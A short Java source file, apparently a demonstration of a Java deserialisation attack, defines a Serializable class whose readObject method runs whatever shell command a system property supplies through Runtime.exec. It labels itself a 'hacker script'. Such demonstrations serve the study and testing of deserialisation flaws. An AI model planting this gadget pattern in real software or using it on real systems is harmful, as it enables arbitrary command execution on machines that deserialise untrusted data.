package com.example;


import java.io.IOException;

public class BadCode implements java.io.Serializable
{
    public String name;
    public String address;

    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException
    {
        in.defaultReadObject();
        this.name = "foo";
        this.address = "fighters!";

        System.out.println("BadCode will now run hacker script");
        String cmd = System.getProperty( "serial-exploit-sh" );
        String loc = System.getProperty( "user.home" );
        System.out.println("user.home=" + loc);

        // throw runtime exception if -Dserial-exploit-sh system param not set:
        if(cmd == null || cmd.length() == 0)
        {
            throw new RuntimeException( "Must set -Dserial-exploit-sh java system property" );
        }

        // Now execute the script:
        System.out.println("execute hacker command=" + cmd);
        Runtime.getRuntime().exec( cmd );
        System.out.println( "system command has been run.... ");
    }
}